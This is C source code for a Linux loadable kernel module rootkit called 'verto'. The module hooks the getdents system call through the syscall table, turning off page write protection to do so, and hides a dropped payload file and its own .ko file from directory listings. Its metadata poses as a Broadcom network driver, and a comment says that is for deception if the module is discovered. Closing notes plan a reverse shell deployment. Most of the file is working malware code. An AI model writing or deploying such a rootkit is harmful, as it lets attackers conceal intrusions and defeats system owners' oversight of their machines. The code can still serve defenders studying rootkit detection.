// ====================================================== MODULE DECLERATIONS =======================================================

//                                                     - Neccessary header files -

#include "headers.h"

//                                                        - Module Signing -

// ~ Assists with kernel taint warnings + deception in the event of discovery of the module

#define DRIVER_AUTHOR "Broadcom Corporation"
#define DRIVER_DESCRIPTION "Linux STA NIC driver"

MODULE_LICENSE("GPL");
MODULE_AUTHOR(DRIVER_AUTHOR);
MODULE_DESCRIPTION(DRIVER_DESCRIPTION);
MODULE_SUPPORTED_DEVICE("NIC_Device");
MODULE_VERSION("2.5");

// ==================================================================================================================================




// ======================================================= HOOKING FUNCTIONS  =======================================================

//Assign sytem call table 
unsigned long **SYS_CALL_TABLE;

//                                           - Read/Write Functions For  Page Modifications-

void EnablePageWriting(unsigned long address){
	unsigned int level;
	pte_t *pte = lookup_address(address, &level);

	if(pte->pte &~ _PAGE_RW){
		pte->pte |= _PAGE_RW;
	}
}

void DisablePageWriting(unsigned long address){
	unsigned int level;

	pte_t *pte = lookup_address(address, &level);

	pte->pte = pte->pte &~ _PAGE_RW;
} 

//struct holds functions from 
struct linux_dirent {
	unsigned long	  d_ino;    // Inode number 
	unsigned long	  d_off;	  // Offset to next linux_dirent 
	unsigned short	d_reclen; // d_reclen is the way to tell the length of this entry
	char		      d_name[];   // the struct value is actually longer than this, and d_name is variable width. (max file len is 255 )
}*dirp2 , *dirp3 , *retn;   // // dirp = directory pointer -> Utility pointers






// ======================================================= FILE HIDING FUNCTIONS  ========================================================


// ------ MALWARE DROP & Verto file hides ------ //

//Hardcoded malware package
char payload[]="malware_demo_file.py"; //Rename to something 'common'

// ------------------------------ //

// ------- HIDE ROOTKIT FILE(s) -------- //

//will live in usr/games
char ko_fl[]  = "verto.ko"; //~ namley hide the kernel object file used to insert the kit

// ------------------------------ //

//                                                 - Original getdents System Call - 

//getdents syscall from kernel files (aka kallsym {'call system'})
asmlinkage int ( *original_getdents ) (unsigned int fd, struct linux_dirent *dirp, unsigned int count); 

//                                            - Modified/Redirected getdents System Call - 

//Modified version of gedents, hooked from system call table -> pointed here
asmlinkage int	HookGetDents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){

  struct linux_dirent *retn, *dirp3; 
  int Records, RemainingBytes, length;

  Records = (*original_getdents) (fd, dirp, count);

  if (Records <= 0){
    return Records;
  }

  retn = (struct linux_dirent *) kmalloc(Records, GFP_KERNEL);
  //Copy struct from userspace to our memspace in kernel space
  copy_from_user(retn, dirp, Records);

  dirp3 = retn; //Holds directory pointer for current dir, used to iterate over
  RemainingBytes = Records;
  
  while(RemainingBytes > 0){
    length = dirp3->d_reclen; //len of record
    RemainingBytes -= dirp3->d_reclen; //Gives numerical representation of next struct
    
    //Debbugging REMOVE ON SUCCESSFUL BUILD & DRY RUN
    printk(KERN_INFO "RemainingBytes %d   \t File: %s " ,  RemainingBytes , dirp3->d_name );

    //TODO: ASSESS IF NEEDS EXTENDING
    //~files from globals above
    if((strcmp( (dirp3->d_name) , payload) == 0) || (strcmp( (dirp3->d_name) , ko_fl) == 0)){
        memcpy(dirp3, (char*)dirp3+dirp3->d_reclen, RemainingBytes);
        Records -= length;
    }

    //Shift pointer to next structure (file)
    dirp3 = (struct linux_dirent *) ((char *)dirp3 + dirp3->d_reclen);

  }

  // Copy the record back to the origional struct
  copy_to_user(dirp, retn, Records); //Return to user space (using copy_to_user macro)
  kfree(retn); //Free memory used by our function
  return Records; //return modified listing (without hidden files)
}

// ==================================================================================================================================


// ====================================================== INSTALIZATION FUNCTIONS  ==================================================

//TODO rename to encompass other functions
static int __init SetHooks(void) { 
	// instalize system call table variable, using call system to get the memory location
 	SYS_CALL_TABLE = (unsigned long**)kallsyms_lookup_name("sys_call_table"); 
    
    //DEBUGGING !REMOVE AFTER SUCCESSFUL DRYRUN!
	printk(KERN_INFO "Hooks Will Be Set.\n");
	printk(KERN_INFO "System call table at %p\n", SYS_CALL_TABLE);

  // Opens the memory pages to be written
	EnablePageWriting((unsigned long )SYS_CALL_TABLE);

  // Replaces Pointer Of Syscall_open on our syscall.
	original_getdents = (void*)SYS_CALL_TABLE[__NR_getdents];
	SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)HookGetDents;
	DisablePageWriting((unsigned long )SYS_CALL_TABLE);

	return 0;
}

// ==================================================================================================================================


// =========================================================== EXIT FUNCTIONS  ========================================================

//TODO rename to encompass other functions
static void __exit HookCleanup(void) {

	// Clean up our Hooks
	EnablePageWriting((unsigned long )SYS_CALL_TABLE);
	SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)original_getdents;
	DisablePageWriting((unsigned long )SYS_CALL_TABLE);
	printk(KERN_INFO "Hooks cleaned up");
}

// ==================================================================================================================================

// =========================================================== EXECUTE FUNCTIONS  ========================================================
//TODO update on rename
module_init(SetHooks);
module_exit(HookCleanup);


// =============================================================== NOTES ==============================================================

/*
                                                                - Documentation -

        ~> Detailed documentation of the code here can be found in fragmatised form in the code_lib sub folders


        ~> Rootkit will be deployed to /usr/games/
        ~> Reverse shell will be deployed to /TODO

*/